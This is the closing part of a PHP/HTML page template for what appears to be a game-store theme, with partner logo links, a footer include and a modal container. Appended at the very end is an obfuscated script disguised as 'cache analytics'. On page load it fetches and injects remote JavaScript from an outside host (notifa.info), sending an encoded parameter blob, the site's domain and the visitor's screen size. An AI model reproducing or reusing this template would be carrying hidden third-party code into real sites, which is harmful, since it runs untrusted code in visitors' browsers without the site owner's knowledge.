                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="1350">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="1500">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="clearfix"></div>
        </div>
      </div>
    </div>
  </div>
  
  <!-- footer -->
  <?php include 'v_footer.php'; ?>
  <div class="modal fade" id="quick-shop-modal"></div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2qtr5mzDp7A9m7veP34axFi1JzkRTDWLisU59C0i7DjQSgYw%2b3XqZcG4Lrd6b236xx%2bIEKMeE9mUrkaRLn%2fsTBCeZn4tF5KwWSUFZAAYZansKi%2fNLEl1W445U7ZKWLecCVHBelUmPejUhUicV%2bzUGA9%2fxHTjQAiqMRBKmZA%2fzTbUT5SRfriJMtT4FGd5iXB3M1SRvEXndr0vaqZDXO5CqNczRrO42Hnrp3jhDTGlpAFXnOb%2b%2fZzvUnEwGXwEgAG7NxhwR5pBlSMkgyDnnPrDFGYgXoIkevq0KeT7SZhh%2bYIsuxPNIjsXC2zX3cu%2bieMUQ9HkGfnMkpx5alZBuxUNGRvE18hijzMPSD9qd2NA5BJ3aPapckwo3HaLsvQyhJoo5sFbgUJz%2fC34rVaYzZADPaZ0Or0hmKgcz%2fYhBJxLhcoXD0ALg3tS5P3yGfODpLrG94JizQnDvkGsQESHc2dwWejSu7iyeFQ4m7ljPP4UzR9ZxVGDJs3yAJmlCFl1MQkqI10RAQA%2f1H9m%2bvuwIxKUry1%2bAyLUfkR1nhPSE7hlHTihDB2e348Rhn%2bWZFGD%2fXvD7kLk6GnIObGg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
